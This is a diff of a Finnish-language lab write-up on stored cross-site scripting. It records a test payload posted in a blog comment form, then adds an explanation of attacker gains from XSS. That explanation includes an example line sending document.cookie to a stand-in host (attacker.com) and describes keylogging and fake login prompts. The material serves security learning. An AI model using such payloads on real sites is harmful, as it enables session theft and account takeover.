@@ -200,18 +200,26 @@ Payload: Hakukentän kautta syötettiin suoritettavaa JavaScript-koodia sisält�
 
 ## d) Stored XSS into HTML context with nothing encoded
 
+
+### Havainnointi ja syötteen lähettäminen
+
 Tehtävänannossa neuvotaan jättämään kommentti joka palauttaa `alert` funktion kun blogin julkaisua katsotaan
 
 
 <img width="1121" height="308" alt="image" src="https://github.com/user-attachments/assets/0d3d668d-563c-424a-beaa-3f79993cc661" />
 
-### Selaimen kommenttilomake 
+* Avaus/testaus tehtiin blogikirjoituksen kommentointilomakkeella (`Leave a comment`).
+* Kommenttikenttään (`Comment`) syötettiin JavaScript-payload: `<script>alert(1)</script>`, ja lomake lähetettiin HTTP POST -pyynnöllä palvelimelle.
 
 Täytän kommenttikentän `<script>alert(1)</script>` funktiolla, täytän muut kentät Name: `Testaaja` Sähköposti: `test@test.com` Verkkosivu `https://example.com`
 
 <img width="794" height="628" alt="image" src="https://github.com/user-attachments/assets/8b40c25e-7479-457e-8caa-b14b525e0263" />
 
 ### ZAP tulos (POST-pyyntö)
+
+* Palvelin otti POST-pyynnön vastaan ja tallensi syötteen sellaisenaan tietokantaan ilman minkäänlaista sanitointia tai tarkastusta.
+* Kun blogisivu ladattiin uudelleen (`GET /post?postId=...`), palvelin haki kommentin tietokannasta ja sijoitti `<script>` tägin suoraan HTML-vastauksen sekaan ilman HTML-enkoodausta
+* Toisin kuin heijastuneessa (Reflected) XSS-hyökkäyksessä, tässä koodi suoriutuu automaattisesti jokaisella sivun latauskerralla ja kaikille käyttäjille, jotka avaavat kyseisen blogikirjoituksen.
 
 <img width="1714" height="790" alt="image" src="https://github.com/user-attachments/assets/f4094adc-278a-40ee-b088-24b64c34cc72" />
 
@@ -225,7 +233,7 @@ Täytän kommenttikentän `<script>alert(1)</script>` funktiolla, täytän muut 
 
 ### Labra ratkaistu
 
-Kun sivun päivittää Popup ilmestyy uudelleen ilman, että tarvitsis uutta kommenttia jättää. Tämä todistaa haavoittuvuuden olevan tallennettu (Stored).
+Kun sivun päivittää Popup ilmestyy uudelleen ilman, että tarvitsis uutta kommenttia jättää. Tämä todistaa haavoittuvuuden olevan tallennettu.
 
 <img width="1706" height="820" alt="image" src="https://github.com/user-attachments/assets/75e0a94e-96b8-4b2f-9faf-bdb5487a2766" />
 
@@ -235,8 +243,32 @@ Labra meni sillä läpi:
 <img width="976" height="474" alt="image" src="https://github.com/user-attachments/assets/88b07fd4-2a3b-4a19-a68f-f2e43ccbbb83" />
 
 
+## e) Mitä hyökkääjä hyötyy XSS-hyökkäyksestä?
 
+Cross-Site Scripting (XSS) mahdollistaa mielivaltaisen JavaScript-koodin suorittamisen uhrin selaimessa kyseisen sivuston kontekstissa. Tämä antaa hyökkääjälle laajat oikeudet toimia uhrin henkilöllisyydellä.
 
+### Keskeiset hyödyt ja reaalimaailman esimerkit:
+
+* Istuntokaappaus (Session Hijacking / Cookie Theft):
+  
+   *  Miten toimii: JavaScript pystyy lukemaan selaimen evästeet (`document.cookie`). Jos sivusto tallentaa istuntotunnisteen (session token) evästeeseen ilman `HttpOnly` lippua, hyökkääjä voi lähettää sen omalle palvelimelleen:
+   *  `fetch('https://attacker.com/steal?cookie=' + document.cookie);`
+   *  Seuraus: Hyökkääjä syöttää varastetun evästeen omaan selaimeensa ja pääsee sisään uhrin tilille ilman salasanaa.
+
+* Toimintojen kaappaus uhrin puolesta (CSRF-tyyppinen toiminta):
+
+    * Miten toimii: Hyökkääjä voi laittaa skriptin tekemään taustalla taustapyyntöjä (esim. `fetch` tai `XMLHttpRequest`) uhrin jo kirjautuneessa istunnossa.
+    * Esimerkki: Skripti muuttaa uhrin sähköpostiosoitteen tai salasanan profiiliasetuksista, siirtää rahaa verkkopankissa tai lähettää viestejä uhrin nimissä.
+
+ * Kirjautumistietojen kalastelu (DOM-based Phishing):
+   
+    * Miten toimii: Hyökkääjä muokkaa sivun rakennetta (DOM) ajon aikana ja näyttää väärennetyn kirjautumisikkunan ("Istuntosi on vanhentunut, kirjaudu uudelleen").
+    * Seuraus: Kun käyttäjä syöttää käyttäjätunnuksen ja salasanan, ne päätyvät suoraan hyökkääjän palvelimelle.
+
+ * Näppäilynkaappaus (Keylogging):
+
+    * Miten toimii: Skripti kuuntelee käyttäjän näppäinpainalluksia kyseisellä sivulla (`addEventListener('keydown', ...)`).
+    * Seuraus: Kaikki lomakkeisiin kirjoitettu data (kuten luottokorttinumerot ja henkilötiedot) tallentuu hyökkääjälle jo ennen lomakkeen lähetystä.
 
 
 
